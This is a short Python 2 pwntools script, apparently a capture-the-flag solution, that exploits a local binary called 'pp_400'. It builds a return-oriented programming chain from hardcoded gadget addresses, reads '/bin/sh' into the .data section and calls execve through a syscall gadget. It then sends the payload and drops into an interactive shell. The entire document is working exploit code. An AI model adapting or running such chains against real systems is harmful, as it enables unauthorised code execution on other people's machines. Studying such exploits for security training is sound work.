import time

from pwn import *

# addresses of the stdin stream
stdin = 0x804A31c

# some addresses from binary
g_fread = 0x8048c60
g_data_section = 0x804A2F2
g_syscall = 0x80482D7
g_pop_eax = 0x8048755

proc = process(['./pp_400', str(100)])

elf = ELF('./pp_400')
rop = ROP(elf)

# fread(g_data_section, 1, 8, stdin) - read string /bin/sh to some place in .data section
rop.call(g_fread, [g_data_section, 1, 8, stdin])
# mov eax, 11 - the number of execve system code
rop.raw(flat(g_pop_eax, 11, 0x41414141))
# execve(g_data_section, 0, 0)
rop.call(g_syscall, [g_data_section, 0, 0])

print rop.dump()
payload = rop.chain()

print proc.recv(1024)

print "send length of payload"
proc.send(str(len(payload)) + '\n')
time.sleep(1)
print 'send payload'
proc.send(payload)
time.sleep(1)
print 'send /bin/sh'
proc.send('/bin/sh\x00')
time.sleep(1)

proc.interactive()

